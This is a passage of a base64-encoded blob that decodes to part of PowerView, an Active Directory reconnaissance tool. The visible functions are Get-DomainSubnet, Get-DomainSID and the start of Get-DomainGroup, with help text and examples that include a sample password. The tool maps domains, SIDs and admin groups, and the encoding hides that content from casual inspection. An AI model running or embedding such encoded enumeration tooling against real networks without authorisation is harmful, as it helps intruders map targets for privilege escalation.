lbnRpdHlGaWx0ZXIuVHJpbSgpIC1uZSAnJykgKSB7CiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIofCRJZGVudGl0eUZpbHRlcikiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5TdWJuZXRdIFVzaW5nIGFkZGl0aW9uYWwgTERBUCBmaWx0ZXI6ICRMREFQRmlsdGVyIgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiJExEQVBGaWx0ZXIiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRTdWJuZXRTZWFyY2hlci5maWx0ZXIgPSAiKCYob2JqZWN0Q2F0ZWdvcnk9c3VibmV0KSRGaWx0ZXIpIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblN1Ym5ldF0gR2V0LURvbWFpblN1Ym5ldCBmaWx0ZXIgc3RyaW5nOiAkKCRTdWJuZXRTZWFyY2hlci5maWx0ZXIpIgoKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRmluZE9uZSddKSB7ICRSZXN1bHRzID0gJFN1Ym5ldFNlYXJjaGVyLkZpbmRPbmUoKSB9CiAgICAgICAgICAgIGVsc2UgeyAkUmVzdWx0cyA9ICRTdWJuZXRTZWFyY2hlci5GaW5kQWxsKCkgfQogICAgICAgICAgICAkUmVzdWx0cyB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmF3J10pIHsKICAgICAgICAgICAgICAgICAgICAjIHJldHVybiByYXcgcmVzdWx0IG9iamVjdHMKICAgICAgICAgICAgICAgICAgICAkU3VibmV0ID0gJF8KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRTdWJuZXQgPSBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAtUHJvcGVydGllcyAkXy5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkU3VibmV0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5TdWJuZXQnKQoKICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NpdGVOYW1lJ10pIHsKICAgICAgICAgICAgICAgICAgICAjIGhhdmUgdG8gZG8gdGhlIGZpbHRlcmluZyBhZnRlciB0aGUgTERBUCBxdWVyeSBhcyBMREFQIGRvZXNuJ3QgbGV0IHlvdSBzcGVjaWZ5CiAgICAgICAgICAgICAgICAgICAgIyAgIHdpbGRjYXJkcyBmb3IgJ3NpdGVvYmplY3QnIDooCiAgICAgICAgICAgICAgICAgICAgaWYgKCRTdWJuZXQucHJvcGVydGllcyAtYW5kICgkU3VibmV0LnByb3BlcnRpZXMuc2l0ZW9iamVjdCAtbGlrZSAiKiRTaXRlTmFtZSoiKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkU3VibmV0CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2VpZiAoJFN1Ym5ldC5zaXRlb2JqZWN0IC1saWtlICIqJFNpdGVOYW1lKiIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFN1Ym5ldAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRTdWJuZXQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFJlc3VsdHMpIHsKICAgICAgICAgICAgICAgIHRyeSB7ICRSZXN1bHRzLmRpc3Bvc2UoKSB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5TdWJuZXRdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRTdWJuZXRTZWFyY2hlci5kaXNwb3NlKCkKICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRG9tYWluU0lEIHsKPCMKLlNZTk9QU0lTCgpSZXR1cm5zIHRoZSBTSUQgZm9yIHRoZSBjdXJyZW50IGRvbWFpbiBvciB0aGUgc3BlY2lmaWVkIGRvbWFpbi4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpbkNvbXB1dGVyICAKCi5ERVNDUklQVElPTgoKUmV0dXJucyB0aGUgU0lEIGZvciB0aGUgY3VycmVudCBkb21haW4gb3IgdGhlIHNwZWNpZmllZCBkb21haW4gYnkgZXhlY3V0aW5nCkdldC1Eb21haW5Db21wdXRlciB3aXRoIHRoZSAtTERBUEZpbHRlciBzZXQgdG8gKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj04MTkyKQp0byBzZWFyY2ggZm9yIGRvbWFpbiBjb250cm9sbGVycyB0aHJvdWdoIExEQVAuIFRoZSBTSUQgb2YgdGhlIHJldHVybmVkIGRvbWFpbiBjb250cm9sbGVyCmlzIHRoZW4gZXh0cmFjdGVkLgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHVzZSBmb3IgdGhlIHF1ZXJ5LCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluU0lECgouRVhBTVBMRQoKR2V0LURvbWFpblNJRCAtRG9tYWluIHRlc3RsYWIubG9jYWwKCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtRG9tYWluU0lEIC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKU3RyaW5nCgpBIHN0cmluZyByZXByZXNlbnRpbmcgdGhlIHNwZWNpZmllZCBkb21haW4gU0lELgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZShbU3RyaW5nXSldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICdMREFQRmlsdGVyJyA9ICcodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTgxOTIpJwogICAgfQogICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICREQ1NJRCA9IEdldC1Eb21haW5Db21wdXRlciBAU2VhcmNoZXJBcmd1bWVudHMgLUZpbmRPbmUgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxIC1FeHBhbmRQcm9wZXJ0eSBvYmplY3RzaWQKCiAgICBpZiAoJERDU0lEKSB7CiAgICAgICAgJERDU0lELlN1YlN0cmluZygwLCAkRENTSUQuTGFzdEluZGV4T2YoJy0nKSkKICAgIH0KICAgIGVsc2UgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluU0lEXSBFcnJvciBleHRyYWN0aW5nIGRvbWFpbiBTSUQgZm9yICckRG9tYWluJyIKICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5Hcm91cCB7CjwjCi5TWU5PUFNJUwoKUmV0dXJuIGFsbCBncm91cHMgb3Igc3BlY2lmaWMgZ3JvdXAgb2JqZWN0cyBpbiBBRC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpblNlYXJjaGVyLCBHZXQtRG9tYWluT2JqZWN0LCBDb252ZXJ0LUFETmFtZSwgQ29udmVydC1MREFQUHJvcGVydHkgIAoKLkRFU0NSSVBUSU9OCgpCdWlsZHMgYSBkaXJlY3Rvcnkgc2VhcmNoZXIgb2JqZWN0IHVzaW5nIEdldC1Eb21haW5TZWFyY2hlciwgYnVpbGRzIGEgY3VzdG9tCkxEQVAgZmlsdGVyIGJhc2VkIG9uIHRhcmdldGluZy9maWx0ZXIgcGFyYW1ldGVycywgYW5kIHNlYXJjaGVzIGZvciBhbGwgb2JqZWN0cwptYXRjaGluZyB0aGUgY3JpdGVyaWEuIFRvIG9ubHkgcmV0dXJuIHNwZWNpZmljIHByb3BlcnRpZXMsIHVzZQoiLVByb3BlcnRpZXMgc2FtYWNjb3VudG5hbWUsdXNuY2hhbmdlZCwuLi4iLiBCeSBkZWZhdWx0LCBhbGwgZ3JvdXAgb2JqZWN0cyBmb3IKdGhlIGN1cnJlbnQgZG9tYWluIGFyZSByZXR1cm5lZC4gVG8gcmV0dXJuIHRoZSBncm91cHMgYSBzcGVjaWZpYyB1c2VyL2dyb3VwIGlzCmEgcGFydCBvZiwgdXNlIC1NZW1iZXJJZGVudGl0eSBYIHRvIGV4ZWN1dGUgdG9rZW4gZ3JvdXBzIGVudW1lcmF0aW9uLgoKLlBBUkFNRVRFUiBJZGVudGl0eQoKQSBTYW1BY2NvdW50TmFtZSAoZS5nLiBHcm91cDEpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiBDTj1ncm91cDEsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksClNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMTQpLCBvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMikKc3BlY2lmeWluZyB0aGUgZ3JvdXAgdG8gcXVlcnkgZm9yLiBXaWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIE1lbWJlcklkZW50aXR5CgpBIFNhbUFjY291bnROYW1lIChlLmcuIEdyb3VwMSksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIENOPWdyb3VwMSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsKSwKU0lEIChlLmcuIFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTExNCksIG9yIEdVSUQgKGUuZy4gNGM0MzVkZDctZGM1OC00YjE0LTlhNWUtMWZkYjBlODBkMjAyKQpzcGVjaWZ5aW5nIHRoZSB1c2VyL2dyb3VwIG1lbWJlciB0byBxdWVyeSBmb3IgZ3JvdXAgbWVtYmVyc2hpcC4KCi5QQVJBTUVURVIgQWRtaW5Db3VudAoKU3dpdGNoLiBSZXR1cm4gdXNlcnMgd2l0aCAnKGFkbWluQ291bnQ9MSknIChtZWFuaW5nIGFyZS93ZXJlIHByaXZpbGVnZWQpLgoKLlBBUkFNRVRFUiBHcm91cFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIChEb21haW5Mb2NhbCwgR2xvYmFsLCBvciBVbml2ZXJzYWwpIG9mIHRoZSBncm91cChzKSB0byBzZWFyY2ggZm9yLgpBbHNvIGFjY2VwdHMgTm90RG9tYWluTG9jYWwsIE5vdEdsb2JhLCBhbmQgTm90VW5pdmVyc2FsIGFzIG5lZ2F0aW9ucy4KCi5QQVJBTUVURVIgR3JvdXBQcm9wZXJ0eQoKU3BlY2lmaWVzIGEgc3BlY2lmaWMgcHJvcGVydHkgdG8gc2VhcmNoIGZvciB3aGVuIHBlcmZvcm1pbmcgdGhlIGdyb3VwIHNlYXJjaC4KUG9zc2libGUgdmFsdWVzIGFyZSBTZWN1cml0eSwgRGlzdHJpYnV0aW9uLCBDcmVhdGVkQnlTeXN0ZW0sIGFuZCBOb3RDcmVhdGVkQnlTeXN0ZW0uCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIGZvciB0aGUgcXVlcnksIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBmaWx0ZXIgQWN0aXZlIERpcmVjdG9yeSBvYmplY3RzLgoKLlBBUkFNRVRFUiBQcm9wZXJ0aWVzCgpTcGVjaWZpZXMgdGhlIHByb3BlcnRpZXMgb2YgdGhlIG91dHB1dCBvYmplY3QgdG8gcmV0cmlldmUgZnJvbSB0aGUgc2VydmVyLgoKLlBBUkFNRVRFUiBTZWFyY2hCYXNlCgpUaGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2gsIGUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIKVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBTZWN1cml0eU1hc2tzCgpTcGVjaWZpZXMgYW4gb3B0aW9uIGZvciBleGFtaW5pbmcgc2VjdXJpdHkgaW5mb3JtYXRpb24gb2YgYSBkaXJlY3Rvcnkgb2JqZWN0LgpPbmUgb2YgJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIEZpbmRPbmUKCk9ubHkgcmV0dXJuIG9uZSByZXN1bHQgb2JqZWN0LgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLlBBUkFNRVRFUiBSYXcKClN3aXRjaC4gUmV0dXJuIHJhdyByZXN1bHRzIGluc3RlYWQgb2YgdHJhbnNsYXRpbmcgdGhlIGZpZWxkcyBpbnRvIGEgY3VzdG9tIFBTT2JqZWN0LgoKLkVYQU1QTEUKCkdldC1Eb21haW5Hcm91cCB8IHNlbGVjdCBzYW1hY2NvdW50bmFtZQoKc2FtYWNjb3VudG5hbWUKLS0tLS0tLS0tLS0tLS0KV2luUk1SZW1vdGVXTUlVc2Vyc19fCkFkbWluaXN0cmF0b3JzClVzZXJzCkd1ZXN0cwpQcmludCBPcGVyYXRvcnMKQmFja3VwIE9wZXJhdG9ycwouLi4KCi5FWEFNUExFCgpHZXQtRG9tYWluR3JvdXAgKmFkbWluKiB8IHNlbGVjdCBkaXN0aW5ndWlzaGVkbmFtZQoKZGlzdGluZ3Vpc2hlZG5hbWUKLS0tLS0tLS0tLS0tLS0tLS0KQ049QWRtaW5pc3RyYXRvcnMsQ049QnVpbHRpbixEQz10ZXN0bGFiLERDPWxvY2FsCkNOPUh5cGVyLVYgQWRtaW5pc3RyYXRvcnMsQ049QnVpbHRpbixEQz10ZXN0bGFiLERDPWxvY2FsCkNOPVNjaGVtYSBBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApDTj1FbnRlcnByaXNlIEFkbWlucyxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCkNOPURvbWFpbiBBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApDTj1EbnNBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApDTj1TZXJ2ZXIgQWRtaW5zLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKQ049RGVza3RvcCBBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbAoKLkVYQU1QTEUKCkdldC1Eb21haW5Hcm91cCAtUHJvcGVydGllcyBzYW1hY2NvdW50bmFtZSAtSWRlbnRpdHkgJ1MtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTExNycgfCBmbAoKc2FtYWNjb3VudG5hbWUKLS0tLS0tLS0tLS0tLS0KU2VydmVyIEFkbWlucwoKLkVYQU1QTEUKCidDTj1EZXNrdG9wIEFkbWlucyxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsJyB8IEdldC1Eb21haW5Hcm91cCAtU2VydmVyIHByaW1hcnkudGVzdGxhYi5sb2NhbCAtVmVyYm9zZQpWRVJCT1NFOiBHZXQtRG9tYWluU2VhcmNoZXIgc2VhcmNoIHN0cmluZzogTERBUDovL0RDPXRlc3RsYWIsREM9bG9jYWwKVkVSQk9TRTogR2V0LURvbWFpbkdyb3VwIGZpbHRlciBzdHJpbmc6ICgmKG9iamVjdENhdGVnb3J5PWdyb3VwKSh8KGRpc3Rpbmd1aXNoZWRuYW1lPUNOPURlc2t0b3BBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCkpKQoKdXNuY3JlYXRlZCAgICAgICAgICAgIDogMTMyNDUKZ3JvdXB0eXBlICAgICAgICAgICAgIDogLTIxNDc0ODM2NDYKc2FtYWNjb3VudHR5cGUgICAgICAgIDogMjY4NDM1NDU2CnNhbWFjY291bnRuYW1lICAgICAgICA6IERlc2t0b3AgQWRtaW5zCndoZW5jaGFuZ2VkICAgICAgICAgICA6IDgvMTAvMjAxNiAxMjozMDozMCBBTQpvYmplY3RzaWQgICAgICAgICAgICAgOiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMTgKb2JqZWN0Y2xhc3MgICAgICAgICAgIDoge3RvcCwgZ3JvdXB9CmNuICAgICAgICAgICAgICAgICAgICA6IERlc2t0b3AgQWRtaW5zCnVzbmNoYW5nZWQgICAgICAgICAgICA6IDEzMjU1CmRzY29yZXByb3BhZ2F0aW9uZGF0YSA6IDEvMS8xNjAxIDEyOjAwOjAwIEFNCm5hbWUgICAgICAgICAgICAgICAgICA6IERlc2t0b3AgQWRtaW5zCmRpc3Rpbmd1aXNoZWRuYW1lICAgICA6IENOPURlc2t0b3AgQWRtaW5zLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKbWVtYmVyICAgICAgICAgICAgICAgIDogQ049QW5keSBSb2JiaW5zIChhZG1pbiksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbAp3aGVuY3JlYXRlZCAgICAgICAgICAgOiA4LzEwLzIwMTYgMTI6Mjk6NDMgQU0KaW5zdGFuY2V0eXBlICAgICAgICAgIDogNApvYmplY3RndWlkICAgICAgICAgICAgOiBmMzc5MDNlZC1iMzMzLTQ5ZjQtYWJhYS00NmM2NWU5Y2NhNzEKb2JqZWN0Y2F0ZWdvcnkgICAgICAgIDogQ049R3JvdXAsQ049U2NoZW1hLENOPUNvbmZpZ3VyYXRpb24sREM9dGVzdGxhYixEQz1sb2NhbAoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5Hcm91cCAtQ3JlZGVudGlhbCAkQ3JlZAoKLkVYQU1QTEUKCkdldC1Eb21haW4gfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmQgbmFtZQp0ZXN0bGFiLmxvY2FsCgonREVWXERvbWFpbiBBZG1pbnMnIHwgR2V0LURvbWFpbkdyb3VwIC1WZXJib3NlIC1Qcm9wZXJ0aWVzIGRpc3Rpbmd1aXNoZWRuYW1lClZFUkJPU0U6IFtHZXQtRG9tYWluU2VhcmNoZXJdIHNlYXJjaCBzdHJpbmc6IExEQVA6Ly9QUklNQVJZLnRlc3RsYWIubG9jYWwvREM9dGVzdGxhYixEQz1sb2NhbApWRVJCT1NFOiBbR2V0LURvbWFpbkdyb3VwXSBFeHRyYWN0ZWQgZG9tYWluICdkZXYudGVzdGxhYi5sb2NhbCcgZnJvbSAnREVWXERvbWFpbiBBZG1pbnMnClZFUkJPU0U6IFtHZXQtRG9tYWluU2VhcmNoZXJdIHNlYXJjaCBzdHJpbmc6IExEQVA6Ly9QUklNQVJZLnRlc3RsYWIubG9jYWwvREM9ZGV2LERDPXRlc3RsYWIsREM9bG9jYWwKVkVSQk9TRTogW0dldC1Eb21haW5Hcm91cF0gZmlsdGVyIHN0cmluZzogKCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXApKHwoc2FtQWNjb3VudE5hbWU9RG9tYWluIEFkbWlucykpKQoKZGlzdGluZ3Vpc2hlZG5hbWUKLS0tLS0tLS0tLS0tLS0tLS0KQ049RG9tYWluIEFkbWlucyxDTj1Vc2VycyxEQz1kZXYsREM9dGVzdGxhYixEQz1sb2NhbAoKLk9VVFBVVFMKClBvd2VyVmlldy5Hcm91cAoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCBncm91cCBwcm9wZXJ0eSBmaWVsZHMuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZURlY2xhcmVkVmFyc01vcmVUaGFuQXNzaWdubWVudHMnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3Lkdyb3VwJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdBbGxvd0RlbGVnYXRpb24nKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnRGlzdGluZ3Vpc2hlZE5hbWUnLCAnU2FtQWNjb3VudE5hbWUnLCAnTmFtZScsICdNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZScsICdNZW1iZXJOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRJZGVudGl0eSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1VzZXJOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTWVtYmVySWRlbnRpdHksCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEFkbWluQ291bnQsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnRG9tYWluTG9jYWwnLCAnTm90RG9tYWluTG9jYWwnLCAnR2xvYmFsJywgJ05vdEdsb2JhbCcsICdVbml2ZXJzYWwnLCAnTm90VW5pdmVyc2FsJyldCiAgICAgICAgW0FsaWFzKCdTY29wZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEdyb3VwU2NvcGUsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnU2VjdXJpdHknLCAnRGlzdHJpYnV0aW9uJywgJ0NyZWF0ZWRCeVN5c3RlbScsICdOb3RDcmVhdGVkQnlTeXN0ZW0nKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRHcm91cFByb3BlcnR5LAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWN1cml0eU1hc2tzLAoKICAgICAgICBbU3dpdGNoXQogICAgIC